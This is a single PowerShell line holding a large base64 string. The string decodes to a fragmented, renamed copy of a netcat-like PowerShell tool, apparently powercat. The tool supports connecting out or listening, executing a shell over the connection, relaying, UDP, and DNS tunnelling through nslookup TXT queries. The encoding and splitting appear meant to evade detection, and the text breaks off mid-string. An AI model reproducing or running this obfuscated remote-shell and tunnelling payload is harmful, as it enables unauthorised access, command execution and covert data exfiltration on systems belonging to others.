$e = [System.Convert]::FromBase64String('JGZyYWdtZW50cyA9IEAoJ2Z1bmN0aW9uIHBpd2VyCnsnLCcKICBwYXJhbSgKICAgIFthJywnbGlhcygiQ2xpZW50IildWycsJ3N0cmluZ10kYz0iIiwKICAnLCcgIFthbGlhcygiTGlzdGVuJywnIildW3N3aXRjaF0kbD0kRicsJ2Fsc2UsCiAgICBbYWxpYXMnLCcoIlBvcnQiKV1bUGFyYW1lJywndGVyKFBvc2l0aW9uPS0xKScsJ11bc3RyaW5nXSRwPSIiLAonLCcgICAgW2FsaWFzKCJFeGVjJywndXRlIildW3N0cmluZ10kZScsJz0iIiwKICAgIFthbGlhcygnLCciRXhlY3V0ZVBvd2Vyc2hlJywnbGwiKV1bc3dpdGNoXSRlcCcsJz0kRmFsc2UsCiAgICBbYWwnLCdpYXMoIlJlbGF5IildW3N0JywncmluZ10kcj0iIiwKICAgICcsJ1thbGlhcygiVURQIildW3MnLCd3aXRjaF0kdT0kRmFsc2UsJywnCiAgICBbYWxpYXMoImRucycsJ2NhdDIiKV1bc3RyaW5nXSQnLCdkbnM9IiIsCiAgICBbYWxpJywnYXMoIkROU0ZhaWx1cmVUaCcsJ3Jlc2hvbGQiKV1baW50MzInLCddJGRuc2Z0PTEwLAogICAgJywnW2FsaWFzKCJUaW1lb3V0IicsJyldW2ludDMyXSR0PTYwLAonLCcgICAgW1BhcmFtZXRlcihWJywnYWx1ZUZyb21QaXBlbGluZScsJz0kVHJ1ZSldW2FsaWFzKCInLCdJbnB1dCIpXSRpPSRudWxsJywnLAogICAgW1ZhbGlkYXRlUycsJ2V0KCcnSG9zdCcnLCAnJ0J5dGUnLCdzJycsICcnU3RyaW5nJycpXVthJywnbGlhcygiT3V0cHV0VHlwZScsJyIpXVtzdHJpbmddJG89IkgnLCdvc3QiLAogICAgW2FsaWFzJywnKCJPdXRwdXRGaWxlIildWycsJ3N0cmluZ10kb2Y9IiIsCiAnLCcgICBbYWxpYXMoIkRpc2NvJywnbm5lY3QiKV1bc3dpdGNoXScsJyRkPSRGYWxzZSwKICAgIFsnLCdhbGlhcygiUmVwZWF0ZXIiJywnKV1bc3dpdGNoXSRyZXA9JCcsJ0ZhbHNlLAogICAgW2FsaWEnLCdzKCJHZW5lcmF0ZVBheWxvJywnYWQiKV1bc3dpdGNoXSRnPScsJyRGYWxzZSwKICAgIFthbGknLCdhcygiR2VuZXJhdGVFbmNvJywnZGVkIildW3N3aXRjaF0kZycsJ2U9JEZhbHNlLAogICAgW2EnLCdsaWFzKCJIZWxwIildW3N3JywnaXRjaF0kaD0kRmFsc2UKICcsJyApCgogIAogICMjIyMjIyMnLCcjIyMjIyMjIyBWQUxJREFUJywnRSBBUkdTICMjIyMjIyMjIycsJyMjIyMjIwogICRnbG9iYWwnLCc6VmVyYm9zZSA9ICRWZXJiJywnb3NlCiAgaWYoJG9mIC1uZScsJyAnJycnKXskbyA9ICcnQnl0ZXMnLCcnJ30KICBpZigkZG5zIC1lcScsJyAiIikKICB7CiAgICBpZignLCcoKCRjIC1lcSAiIikgLWFuJywnZCAoISRsKSkgLW9yICgoJCcsJ2MgLW5lICIiKSAtYW5kICQnLCdsKSl7cmV0dXJuICJZb3UgJywnbXVzdCBzZWxlY3QgZWl0aCcsJ2VyIGNsaWVudCBtb2RlICgnLCctYykgb3IgbGlzdGVuIG1vJywnZGUgKC1sKS4ifQogICAgaScsJ2YoJHAgLWVxICIiKXtyZXQnLCd1cm4gIlBsZWFzZSBwcm92JywnaWRlIGEgcG9ydCBudW1iZScsJ3IgdG8gLXAuIn0KICB9CiAnLCcgaWYoKCgoJHIgLW5lICIiJywnKSAtYW5kICgkZSAtbmUgIicsJyIpKSAtb3IgKCgkZSAtbmUnLCcgIiIpIC1hbmQgKCRlcCkpJywnKSAtb3IgICgoJHIgLW5lICcsJyIiKSAtYW5kICgkZXApKSknLCd7cmV0dXJuICJZb3UgY2FuJywnIG9ubHkgcGljayBvbmUgbycsJ2YgdGhlc2U6IC1lLCAtZXAnLCcsIC1yIn0KICBpZigoJGkgJywnLW5lICRudWxsKSAtYW5kICcsJygoJHIgLW5lICIiKSAtb3InLCcgKCRlIC1uZSAiIikpKXtyJywnZXR1cm4gIi1pIGlzIG5vdCcsJyBhcHBsaWNhYmxlIGhlcmUnLCcuIn0KICBpZigkbCkKICB7JywnCiAgICAkRmFpbHVyZSA9ICcsJyRGYWxzZQogICAgbmV0c3QnLCdhdCAtbmEgfCBTZWxlY3QtJywnU3RyaW5nIExJU1RFTklORycsJyB8ICUge2lmKCgkXy5Ub1MnLCd0cmluZygpLnNwbGl0KCI6JywnIilbMV0uc3BsaXQoIiAiKScsJ1swXSkgLWVxICRwKXtXcmknLCd0ZS1PdXRwdXQgKCJUaGUgJywnc2VsZWN0ZWQgcG9ydCAiICcsJysgJHAgKyAiIGlzIGFscmUnLCdhZHkgaW4gdXNlLiIpIDsgJywnJEZhaWx1cmU9JFRydWV9fScsJwogICAgaWYoJEZhaWx1cmUnLCcpe2JyZWFrfQogIH0KICBpJywnZigkciAtbmUgIiIpCiAgeycsJwogICAgaWYoJHIuc3BsaXQnLCcoIjoiKS5Db3VudCAtZXEgJywnMikKICAgIHsKICAgICAgJCcsJ0ZhaWx1cmUgPSAkRmFsc2UnLCcKICAgICAgbmV0c3RhdCAtJywnbmEgfCBTZWxlY3QtU3RyaScsJ25nIExJU1RFTklORyB8ICUnLCcge2lmKCgkXy5Ub1N0cmluJywnZygpLnNwbGl0KCI6IilbMScsJ10uc3BsaXQoIiAiKVswXSknLCcgLWVxICRyLnNwbGl0KCI6JywnIilbMV0pe1dyaXRlLU91dCcsJ3B1dCAoIlRoZSBzZWxlY3QnLCdlZCBwb3J0ICIgKyAkci5zJywncGxpdCgiOiIpWzFdICsgIicsJyBpcyBhbHJlYWR5IGluIHUnLCdzZS4iKSA7ICRGYWlsdXJlJywnPSRUcnVlfX0KICAgICAgaScsJ2YoJEZhaWx1cmUpe2JyZWEnLCdrfQogICAgfQogIH0KICAjJywnIyMjIyMjIyMjIyMjIyMgVicsJ0FMSURBVEUgQVJHUyAjIyMnLCcjIyMjIyMjIyMjIyMKICAKJywnICAjIyMjIyMjIyMjIyMjIycsJyMgVURQIEZVTkNUSU9OUyAnLCcjIyMjIyMjIyMjIyMjIyMKJywnICBmdW5jdGlvbiBTZXR1cCcsJ19VRFAKICB7CiAgICBwYXInLCdhbSgkRnVuY1NldHVwVmFyJywncykKICAgIGlmKCRnbG9iYScsJ2w6VmVyYm9zZSl7JFZlcmInLCdvc2UgPSAkVHJ1ZX0KICAgJywnICRjLCRsLCRwLCR0ID0gJCcsJ0Z1bmNTZXR1cFZhcnMKICAnLCcgICRGdW5jVmFycyA9IEB7JywnfQogICAgJEZ1bmNWYXJzWycsJyJFbmNvZGluZyJdID0gTmUnLCd3LU9iamVjdCBTeXN0ZW0uJywnVGV4dC5Bc2NpaUVuY29kaScsJ25nCiAgICBpZigkbCkKICAnLCcgIHsKICAgICAgJFNvY2tlJywndERlc3RpbmF0aW9uQnVmZicsJ2VyID0gTmV3LU9iamVjdCAnLCdTeXN0ZW0uQnl0ZVtdIDY1JywnNTM2CiAgICAgICRFbmRQbycsJ2ludCA9IE5ldy1PYmplY3QnLCcgU3lzdGVtLk5ldC5JUEVuJywnZFBvaW50IChbU3lzdGVtLicsJ05ldC5JUEFkZHJlc3NdOjonLCdBbnkpLCAkcAogICAgICAkJywnRnVuY1ZhcnNbIlNvY2tldCcsJyJdID0gTmV3LU9iamVjdCAnLCdTeXN0ZW0uTmV0LlNvY2tlJywndHMuVURQQ2xpZW50ICRwCicsJyAgICAgICRQYWNrZXRJbmYnLCdvID0gTmV3LU9iamVjdCBTJywneXN0ZW0uTmV0LlNvY2tldCcsJ3MuSVBQYWNrZXRJbmZvcm0nLCdhdGlvbgogICAgICBXcml0JywnZS1WZXJib3NlICgiTGlzdCcsJ2VuaW5nIG9uIFswLjAuMC4nLCcwXSBwb3J0ICIgKyAkcCArJywnICIgW3VkcF0iKQogICAgICcsJyAkQ29ubmVjdEhhbmRsZSAnLCc9ICRGdW5jVmFyc1siU29jJywna2V0Il0uQ2xpZW50LkJlZycsJ2luUmVjZWl2ZU1lc3NhZ2UnLCdGcm9tKCRTb2NrZXREZXN0JywnaW5hdGlvbkJ1ZmZlciwwLCcsJzY1NTM2LFtTeXN0ZW0uTmUnLCd0LlNvY2tldHMuU29ja2V0JywnRmxhZ3NdOjpOb25lLFtyZScsJ2ZdJEVuZFBvaW50LCRudWwnLCdsLCRudWxsKQogICAgICAkJywnU3RvcHdhdGNoID0gW1N5cycsJ3RlbS5EaWFnbm9zdGljcy4nLCdTdG9wd2F0Y2hdOjpTdGFyJywndE5ldygpCiAgICAgIHdoaScsJ2xlKCRUcnVlKQogICAgICAnLCd7CiAgICAgICAgaWYoJEhvJywnc3QuVUkuUmF3VUkuS2V5QScsJ3ZhaWxhYmxlKQogICAgICAnLCcgIHsKICAgICAgICAgIGlmJywnKEAoMTcsMjcpIC1jb250YScsJ2lucyAoJEhvc3QuVUkuUmEnLCd3VUkuUmVhZEtleSgiTm9FJywnY2hvLEluY2x1ZGVLZXlEbycsJ3duLEluY2x1ZGVLZXlVcCInLCcpLlZpcnR1YWxLZXlDb2RlJywnKSkKICAgICAgICAgIHsKICcsJyAgICAgICAgICAgV3JpdGUnLCctVmVyYm9zZSAiQ1RSTCBvJywnciBFU0MgY2F1Z2h0LiBTdCcsJ29wcGluZyBVRFAgU2V0dXAnLCcuLi4iCiAgICAgICAgICAgJywnICRGdW5jVmFyc1siU29jaycsJ2V0Il0uQ2xvc2UoKQogICAnLCcgICAgICAgICAkU3RvcHdhJywndGNoLlN0b3AoKQogICAgICcsJyAgICAgICBicmVhawogICAnLCcgICAgICAgfQogICAgICAgJywnIH0KICAgICAgICBpZigkUycsJ3RvcHdhdGNoLkVsYXBzZWQnLCcuVG90YWxTZWNvbmRzIC1nJywndCAkdCkKICAgICAgICB7CicsJyAgICAgICAgICAkRnVuY1YnLCdhcnNbIlNvY2tldCJdLkNsJywnb3NlKCkKICAgICAgICAgICcsJyRTdG9wd2F0Y2guU3RvcCgnLCcpCiAgICAgICAgICBXcml0JywnZS1WZXJib3NlICJUaW1lbycsJ3V0ISIgOyBicmVhawogICAnLCcgICAgIH0KICAgICAgICBpJywnZigkQ29ubmVjdEhhbmRsZScsJy5Jc0NvbXBsZXRlZCkKICAnLCcgICAgICB7CiAgICAgICAgJywnICAkU29ja2V0Qnl0ZXNSZScsJ2FkID0gJEZ1bmNWYXJzWyInLCdTb2NrZXQiXS5DbGllbnQuJywnRW5kUmVjZWl2ZU1lc3NhZycsJ2VGcm9tKCRDb25uZWN0SGEnLCduZGxlLFtyZWZdKFtTeXN0JywnZW0uTmV0LlNvY2tldHMuUycsJ29ja2V0RmxhZ3NdOjpOb24nLCdlKSxbcmVmXSRFbmRQb2luJywndCxbcmVmXSRQYWNrZXRJbicsJ2ZvKQogICAgICAgICAgV3InLCdpdGUtVmVyYm9zZSAoIkNvJywnbm5lY3Rpb24gZnJvbSBbIicsJyArICRFbmRQb2ludC5BZGQnLCdyZXNzLklQQWRkcmVzc1RvJywnU3RyaW5nICsgIl0gcG9ydCcsJyAiICsgJHAgKyAiIFt1ZHAnLCddIGFjY2VwdGVkIChzb3VyJywnY2UgcG9ydCAiICsgJEVuZCcsJ1BvaW50LlBvcnQgKyAiKSInLCcpCiAgICAgICAgICBpZigkJywnU29ja2V0Qnl0ZXNSZWFkICcsJy1ndCAwKXticmVha30KICAnLCcgICAgICAgIGVsc2V7YnJlJywnYWt9CiAgICAgICAgfQogICcsJyAgICB9CiAgICAgICRTdG8nLCdwd2F0Y2guU3RvcCgpCiAgJywnICAgICRGdW5jVmFyc1siSScsJ25pdGlhbENvbm5lY3Rpb24nLCdCeXRlcyJdID0gJFNvY2tlJywndERlc3RpbmF0aW9uQnVmZicsJ2VyWzAuLihbaW50XSRTb2MnLCdrZXRCeXRlc1JlYWQtMSldJywnCiAgICB9CiAgICBlbHNlCicsJyAgICB7CiAgICAgIGlmKCEnLCckYy5Db250YWlucygiLiIpJywnKQogICAgICB7CiAgICAgICcsJyAgJElQTGlzdCA9IEAoKQonLCcgICAgICAgIFtTeXN0ZW0uJywnTmV0LkRuc106OkdldEhvcycsJ3RBZGRyZXNzZXMoJGMpIHwnLCcgV2hlcmUtT2JqZWN0IHskJywnXy5BZGRyZXNzRmFtaWx5ICcsJy1lcSAiSW50ZXJOZXR3b3InLCdrIn0gfCAleyRJUExpc3QgJywnKz0gJF8uSVBBZGRyZXNzVCcsJ29TdHJpbmd9CiAgICAgICAnLCcgV3JpdGUtVmVyYm9zZSAoJywnIk5hbWUgIiArICRjICsgIicsJyByZXNvbHZlZCB0byBhZGQnLCdyZXNzICIgKyAkSVBMaXN0JywnWzBdKQogICAgICAgICRFbicsJ2RQb2ludCA9IE5ldy1PYmonLCdlY3QgU3lzdGVtLk5ldC5JJywnUEVuZFBvaW50IChbU3lzdCcsJ2VtLk5ldC5JUEFkZHJlc3MnLCddOjpQYXJzZSgkSVBMaXN0JywnWzBdKSksICRwCiAgICAgICcsJ30KICAgICAgZWxzZQogICAnLCcgICB7CiAgICAgICAgJEVuJywnZFBvaW50ID0gTmV3LU9iaicsJ2VjdCBTeXN0ZW0uTmV0LkknLCdQRW5kUG9pbnQgKFtTeXN0JywnZW0uTmV0LklQQWRkcmVzcycsJ106OlBhcnNlKCRjKSksICQnLCdwCiAgICAgIH0KICAgICAgJywnJEZ1bmNWYXJzWyJTb2NrZScsJ3QiXSA9IE5ldy1PYmplY3QnLCcgU3lzdGVtLk5ldC5Tb2NrJywnZXRzLlVEUENsaWVudAogICcsJyAgICAkRnVuY1ZhcnNbIlMnLCdvY2tldCJdLkNvbm5lY3QoJywnJGMsJHApCiAgICAgIFdyaScsJ3RlLVZlcmJvc2UgKCJTZW4nLCdkaW5nIFVEUCB0cmFmZmljJywnIHRvICIgKyAkYyArICIgcCcsJ29ydCAiICsgJHAgKyAiLi4nLCcuIikKICAgICAgV3JpdGUtJywnVmVyYm9zZSAoIlVEUDogTScsJ2FrZSBzdXJlIHRvIHNlbmQnLCcgc29tZSBkYXRhIHNvIHRoJywnZSBzZXJ2ZXIgY2FuIG5vdCcsJ2ljZSB5b3UhIikKICAgIH0nLCcKICAgICRGdW5jVmFyc1siJywnQnVmZmVyU2l6ZSJdID0gNicsJzU1MzYKICAgICRGdW5jVmEnLCdyc1siRW5kUG9pbnQiXSA9JywnICRFbmRQb2ludAogICAgJCcsJ0Z1bmNWYXJzWyJTdHJlYW0nLCdEZXN0aW5hdGlvbkJ1ZmZlJywnciJdID0gTmV3LU9iamVjdCcsJyBTeXN0ZW0uQnl0ZVtdICQnLCdGdW5jVmFyc1siQnVmZmVyJywnU2l6ZSJdCiAgICAkRnVuYycsJ1ZhcnNbIlN0cmVhbVJlYWQnLCdPcGVyYXRpb24iXSA9ICRGJywndW5jVmFyc1siU29ja2V0IicsJ10uQ2xpZW50LkJlZ2luUmUnLCdjZWl2ZUZyb20oJEZ1bmNWJywnYXJzWyJTdHJlYW1EZXN0aScsJ25hdGlvbkJ1ZmZlciJdLDAnLCcsJEZ1bmNWYXJzWyJCdWZmJywnZXJTaXplIl0sKFtTeXN0ZScsJ20uTmV0LlNvY2tldHMuU28nLCdja2V0RmxhZ3NdOjpOb25lJywnKSxbcmVmXSRGdW5jVmFycycsJ1siRW5kUG9pbnQiXSwkbnUnLCdsbCwkbnVsbCkKICAgIHJlJywndHVybiAkRnVuY1ZhcnMKICcsJyB9CiAgZnVuY3Rpb24gUmUnLCdhZERhdGFfVURQCiAgewogJywnICAgcGFyYW0oJEZ1bmNWYScsJ3JzKQogICAgJERhdGEgPSAnLCckbnVsbAogICAgaWYoJEZ1JywnbmNWYXJzWyJTdHJlYW1SZScsJ2FkT3BlcmF0aW9uIl0uSXMnLCdDb21wbGV0ZWQpCiAgICB7JywnCiAgICAgICRTdHJlYW1CeScsJ3Rlc1JlYWQgPSAkRnVuY1YnLCdhcnNbIlNvY2tldCJdLkNsJywnaWVudC5FbmRSZWNlaXZlRicsJ3JvbSgkRnVuY1ZhcnNbIlMnLCd0cmVhbVJlYWRPcGVyYXRpJywnb24iXSxbcmVmXSRGdW5jVicsJ2Fyc1siRW5kUG9pbnQiXSknLCcKICAgICAgaWYoJFN0cmVhJywnbUJ5dGVzUmVhZCAtZXEgMCcsJyl7YnJlYWt9CiAgICAgICQnLCdEYXRhID0gJEZ1bmNWYXJzJywnWyJTdHJlYW1EZXN0aW5hdCcsJ2lvbkJ1ZmZlciJdWzAuLignLCdbaW50XSRTdHJlYW1CeXRlJywnc1JlYWQtMSldCiAgICAgICcsJyRGdW5jVmFyc1siU3RyZWEnLCdtUmVhZE9wZXJhdGlvbiJdJywnID0gJEZ1bmNWYXJzWyJTbycsJ2NrZXQiXS5DbGllbnQuQmUnLCdnaW5SZWNlaXZlRnJvbSgkJywnRnVuY1ZhcnNbIlN0cmVhbScsJ0Rlc3RpbmF0aW9uQnVmZmUnLCdyIl0sMCwkRnVuY1ZhcnNbJywnIkJ1ZmZlclNpemUiXSwoWycsJ1N5c3RlbS5OZXQuU29ja2UnLCd0cy5Tb2NrZXRGbGFnc106JywnOk5vbmUpLFtyZWZdJEZ1bicsJ2NWYXJzWyJFbmRQb2ludCInLCddLCRudWxsLCRudWxsKQogJywnICAgfQogICAgcmV0dXJuICcsJyREYXRhLCRGdW5jVmFycwonLCcgIH0KICBmdW5jdGlvbiBXJywncml0ZURhdGFfVURQCiAgeycsJwogICAgcGFyYW0oJERhdGEnLCcsJEZ1bmNWYXJzKQogICAgJywnJEZ1bmNWYXJzWyJTb2NrZScsJ3QiXS5DbGllbnQuU2VuZFQnLCdvKCREYXRhLCRGdW5jVmFyJywnc1siRW5kUG9pbnQiXSkgfCcsJyBPdXQtTnVsbAogICAgcmUnLCd0dXJuICRGdW5jVmFycwogJywnIH0KICBmdW5jdGlvbiBDbCcsJ29zZV9VRFAKICB7CiAgICAnLCdwYXJhbSgkRnVuY1ZhcnMpJywnCiAgICAkRnVuY1ZhcnNbIicsJ1NvY2tldCJdLkNsb3NlKCknLCcKICB9CiAgIyMjIyMjIyMjJywnIyMjIyMjIFVEUCBGVU5DVCcsJ0lPTlMgIyMjIyMjIyMjIyMnLCcjIyMjCiAgCiAgIyMjIyMjJywnIyMjIyMjIyMjIEROUyBGVScsJ05DVElPTlMgIyMjIyMjIyMnLCcjIyMjIyMjCiAgZnVuY3RpJywnb24gU2V0dXBfRE5TCiAgeycsJwogICAgcGFyYW0oJEZ1bmMnLCdTZXR1cFZhcnMpCiAgICBpJywnZigkZ2xvYmFsOlZlcmJvcycsJ2UpeyRWZXJib3NlID0gJFQnLCdydWV9CiAgICBmdW5jdGlvJywnbiBDb252ZXJ0VG8tSGV4QScsJ3JyYXkKICAgIHsKICAgICAnLCcgcGFyYW0oJFN0cmluZykKJywnICAgICAgJEhleCA9IEAoKScsJwogICAgICAkU3RyaW5nLlQnLCdvQ2hhckFycmF5KCkgfCAlJywnIHsiezA6eH0iIC1mIFtieScsJ3RlXSRffSB8ICUge2lmKCQnLCdfLkxlbmd0aCAtZXEgMSl7JywnIjAiICsgW3N0cmluZ10kXycsJ30gZWxzZXtbc3RyaW5nXSQnLCdffX0gfCAlIHskSGV4ICs9JywnICRffQogICAgICByZXR1cicsJ24gJEhleAogICAgfQogICAnLCcgCiAgICBmdW5jdGlvbiBTJywnZW5kUGFja2V0CiAgICB7CicsJyAgICAgIHBhcmFtKCRQYWMnLCdrZXQsJEROU1NlcnZlciwkJywnRE5TUG9ydCkKICAgICAgJCcsJ0NvbW1hbmQgPSAoInNldCAnLCd0eXBlPVRYVGBuc2VydmVyJywnICRETlNTZXJ2ZXJgbnNldCcsJyBwb3J0PSRETlNQb3J0YG4nLCdzZXQgZG9tYWluPS5jb21gJywnbnNldCByZXRyeT0xYG4iICcsJysgJFBhY2tldCArICJgbmUnLCd4aXQiKQogICAgICAkcmVzJywndWx0ID0gKCRDb21tYW5kICcsJ3wgbnNsb29rdXAgMj4mMSAnLCd8IE91dC1TdHJpbmcpCiAgJywnICAgIGlmKCRyZXN1bHQuQycsJ29udGFpbnMoJyciJycpKXtyZScsJ3R1cm4gKFtyZWdleF06Ok0nLCdhdGNoKCRyZXN1bHQucmVwJywnbGFjZSgiYmlvPSIsIiIpLCcsJycnKD88PSIpW14iXSooPz0iJywnKScnKS5WYWx1ZSl9CiAgICAnLCcgIGVsc2V7cmV0dXJuIDF9JywnCiAgICB9CiAgICAKICAgICcsJ2Z1bmN0aW9uIENyZWF0ZV8nLCdTWU4KICAgIHsKICAgICAgJywncGFyYW0oJFNlc3Npb25JZCcsJywkU2VxTnVtLCRUYWcsJEQnLCdvbWFpbikKICAgICAgcmV0JywndXJuICgkVGFnICsgKFtzdCcsJ3JpbmddKEdldC1SYW5kb20nLCcgLU1heGltdW0gOTk5OSAtJywnTWluaW11bSAxMDAwKSkgKycsJyAiMDAiICsgJFNlc3Npb24nLCdJZCArICRTZXFOdW0gKyAiJywnMDAwMCIgKyAkRG9tYWluKScsJwogICAgfQogICAgCiAgICAnLCdmdW5jdGlvbiBDcmVhdGVfJywnRklOCiAgICB7CiAgICAgICcsJ3BhcmFtKCRTZXNzaW9uSWQnLCcsJFRhZywkRG9tYWluKQogJywnICAgICByZXR1cm4gKCRUYScsJ2cgKyAoW3N0cmluZ10oR2UnLCd0LVJhbmRvbSAtTWF4aW11JywnbSA5OTk5IC1NaW5pbXVtICcsJzEwMDApKSArICIwMiIgKyAnLCckU2Vzc2lvbklkICsgIjAwJywnIiArICREb21haW4pCiAgICcsJyB9CiAgICAKICAgIGZ1bmMnLCd0aW9uIENyZWF0ZV9NU0cKJywnICAgIHsKICAgICAgcGFyYScsJ20oJFNlc3Npb25JZCwkU2UnLCdxTnVtLCRBY2tub3dsZWRnJywnZW1lbnROdW1iZXIsJERhdCcsJ2EsJFRhZywkRG9tYWluKQonLCcgICAgICByZXR1cm4gKCRUJywnYWcgKyAoW3N0cmluZ10oRycsJ2V0LVJhbmRvbSAtTWF4aW0nLCd1bSA5OTk5IC1NaW5pbXVtJywnIDEwMDApKSArICIwMSIgKycsJyAkU2Vzc2lvbklkICsgJFMnLCdlcU51bSArICRBY2tub3dsJywnZWRnZW1lbnROdW1iZXIgKycsJyAkRGF0YSArICREb21haW4nLCcpCiAgICB9CiAgICAKICAgJywnIGZ1bmN0aW9uIERlY29kZScsJ1BhY2tldAogICAgewogICAnLCcgICBwYXJhbSgkUGFja2V0JywnKQogICAgICAKICAgICAgaScsJ2YoKCgkUGFja2V0LkxlbmcnLCd0aCklMiAtZXEgMSkgLW9yJywnICgkUGFja2V0Lkxlbmd0aCcsJyAtZXEgMCkpe3JldHVybiAnLCcxfQogICAgICAkQWNrbm93JywnbGVkZ2VtZW50TnVtYmVyICcsJz0gKCRQYWNrZXRbMTAuLjEnLCczXSAtam9pbiAiIikKICAgJywnICAgJFNlcU51bSA9ICgkUCcsJ2Fja2V0WzE0Li4xN10gLWonLCdvaW4gIiIpCiAgICAgIFtiJywneXRlW11dJFJldHVybmluZycsJ0RhdGEgPSBAKCkKICAgICAnLCcgCiAgICAgIGlmKCRQYWNrJywnZXQuTGVuZ3RoIC1ndCAxOCcsJykKICAgICAgewogICAgICAnLCcgICRQYWNrZXRFbGltID0gJywnJFBhY2tldC5TdWJzdHJpbicsJ2coMTgpCiAgICAgICAgd2gnLCdpbGUoJFBhY2tldEVsaW0uJywnTGVuZ3RoIC1ndCAwKQogICcsJyAgICAgIHsKICAgICAgICAnLCcgICRSZXR1cm5pbmdEYXRhJywnICs9IFtieXRlW11dW0NvbicsJ3ZlcnRdOjpUb0ludDE2KCgnLCckUGFja2V0RWxpbVswLi4xJywnXSAtam9pbiAiIiksMTYpCicsJyAgICAgICAgICAkUGFja2UnLCd0RWxpbSA9ICRQYWNrZXRFJywnbGltLlN1YnN0cmluZygyKScsJwogICAgICAgIH0KICAgICAnLCcgfQogICAgICAKICAgICAgJywncmV0dXJuICRQYWNrZXQsJCcsJ1JldHVybmluZ0RhdGEsJEEnLCdja25vd2xlZGdlbWVudE51JywnbWJlciwkU2VxTnVtCiAgICcsJyB9CiAgICAKICAgIGZ1bmMnLCd0aW9uIEFja25vd2xlZGdlJywnRGF0YQogICAgewogICAgICcsJyBwYXJhbSgkUmV0dXJuaW4nLCdnRGF0YSwkQWNrbm93bGVkJywnZ2VtZW50TnVtYmVyKQogICcsJyAgICAkSGV4ID0gW3N0cmknLCduZ10oInswOnh9IiAtZiAoJywnKFt1aW50MTZdKCIweCIgKycsJyAkQWNrbm93bGVkZ2VtZW4nLCd0TnVtYmVyKSArICRSZXR1Jywncm5pbmdEYXRhLkxlbmd0aCcsJykgJSA2NTUzNSkpCiAgICAnLCcgIGlmKCRIZXguTGVuZ3RoJywnIC1uZSA0KXskSGV4ID0gKCcsJygiMCIqKDQtJEhleC5MZW4nLCdndGgpKSArICRIZXgpfQogJywnICAgICByZXR1cm4gJEhleCcsJwogICAgfQogICAgJEZ1bmMnLCdWYXJzID0gQHt9CiAgICAkJywnRnVuY1ZhcnNbIkROU1NlcicsJ3ZlciJdLCRGdW5jVmFyc1snLCciRE5TUG9ydCJdLCRGdW5jJywnVmFyc1siRG9tYWluIl0sJCcsJ0Z1bmNWYXJzWyJGYWlsdXInLCdlVGhyZXNob2xkIl0gPSAkJywnRnVuY1NldHVwVmFycwogICcsJyAgaWYoJEZ1bmNWYXJzWyInLCdETlNQb3J0Il0gLWVxICcnJycnLCcpeyRGdW5jVmFyc1siRE5TJywnUG9ydCJdID0gIjUzIn0KICcsJyAgICRGdW5jVmFyc1siVGEnLCdnIl0gPSAiIgogICAgJEZ1JywnbmNWYXJzWyJEb21haW4iXScsJyA9ICgiLiIgKyAkRnVuY1YnLCdhcnNbIkRvbWFpbiJdKQogJywnICAgCiAgICAkRnVuY1ZhcicsJ3NbIkNyZWF0ZV9TWU4iXSAnLCc9ICR7ZnVuY3Rpb246Q3JlJywnYXRlX1NZTn0KICAgICRGdScsJ25jVmFyc1siQ3JlYXRlX00nLCdTRyJdID0gJHtmdW5jdGlvJywnbjpDcmVhdGVfTVNHfQogICcsJyAgJEZ1bmNWYXJzWyJDcmUnLCdhdGVfRklOIl0gPSAke2Z1JywnbmN0aW9uOkNyZWF0ZV9GSScsJ059CiAgICAkRnVuY1ZhcnMnLCdbIkRlY29kZVBhY2tldCJdJywnID0gJHtmdW5jdGlvbjpEZScsJ2NvZGVQYWNrZXR9CiAgICAnLCckRnVuY1ZhcnNbIkNvbnZlJywncnRUby1IZXhBcnJheSJdICcsJz0gJHtmdW5jdGlvbjpDb24nLCd2ZXJ0VG8tSGV4QXJyYXl9JywnCiAgICAkRnVuY1ZhcnNbIicsJ0Fja0RhdGEiXSA9ICR7ZnUnLCduY3Rpb246QWNrbm93bGVkJywnZ2VEYXRhfQogICAgJEZ1bicsJ2NWYXJzWyJTZW5kUGFja2UnLCd0Il0gPSAke2Z1bmN0aW9uJywnOlNlbmRQYWNrZXR9CiAgICcsJyAkRnVuY1ZhcnNbIlNlc3MnLCdpb25JZCJdID0gKFtzdHJpJywnbmddKEdldC1SYW5kb20gLScsJ01heGltdW0gOTk5OSAtTWknLCduaW11bSAxMDAwKSkKICAgJywnICRGdW5jVmFyc1siU2VxTicsJ3VtIl0gPSAoW3N0cmluZ10nLCcoR2V0LVJhbmRvbSAtTWF4JywnaW11bSA5OTk5IC1NaW5pbScsJ3VtIDEwMDApKQogICAgJEYnLCd1bmNWYXJzWyJFbmNvZGluJywnZyJdID0gTmV3LU9iamVjdCcsJyBTeXN0ZW0uVGV4dC5Bc2MnLCdpaUVuY29kaW5nCiAgICAkJywnRnVuY1ZhcnNbIkZhaWx1cicsJ2VzIl0gPSAwCiAgICAKICAnLCcgICRTWU5QYWNrZXQgPSAoJywnSW52b2tlLUNvbW1hbmQgJCcsJ0Z1bmNWYXJzWyJDcmVhdGUnLCdfU1lOIl0gLUFyZ3VtZW50JywnTGlzdCBAKCRGdW5jVmFycycsJ1siU2Vzc2lvbklkIl0sJEYnLCd1bmNWYXJzWyJTZXFOdW0iJywnXSwkRnVuY1ZhcnNbIlRhZycsJyJdLCRGdW5jVmFyc1siRG8nLCdtYWluIl0pKQogICAgJFJlJywnc3BvbnNlUGFja2V0ID0gKCcsJ0ludm9rZS1Db21tYW5kICQnLCdGdW5jVmFyc1siU2VuZFBhJywnY2tldCJdIC1Bcmd1bWVudCcsJ0xpc3QgQCgkU1lOUGFja2UnLCd0LCRGdW5jVmFyc1siRE5TJywnU2VydmVyIl0sJEZ1bmNWYScsJ3JzWyJETlNQb3J0Il0pKQonLCcgICAgJERlY29kZWRQYWNrJywnZXQgPSAoSW52b2tlLUNvbScsJ21hbmQgJEZ1bmNWYXJzWyInLCdEZWNvZGVQYWNrZXQiXSAtJywnQXJndW1lbnRMaXN0IEAoJCcsJ1Jlc3BvbnNlUGFja2V0KSknLCcKICAgIGlmKCREZWNvZGVkJywnUGFja2V0IC1lcSAxKXtyZScsJ3R1cm4gIkJhZCBTWU4gcmUnLCdzcG9uc2UuIEVuc3VyZSB5Jywnb3VyIHNlcnZlciBpcyBzZScsJ3QgdXAgY29ycmVjdGx5LiInLCd9CiAgICAkUmV0dXJuaW5nJywnRGF0YSA9ICREZWNvZGVkUCcsJ2Fja2V0WzFdCiAgICBpZignLCckUmV0dXJuaW5nRGF0YSAtJywnbmUgIiIpeyRGdW5jVmFycycsJ1siSW5wdXREYXRhIl0gPSAnLCciIn0KICAgICRGdW5jVmFyJywnc1siQWNrTnVtIl0gPSAkRCcsJ2Vjb2RlZFBhY2t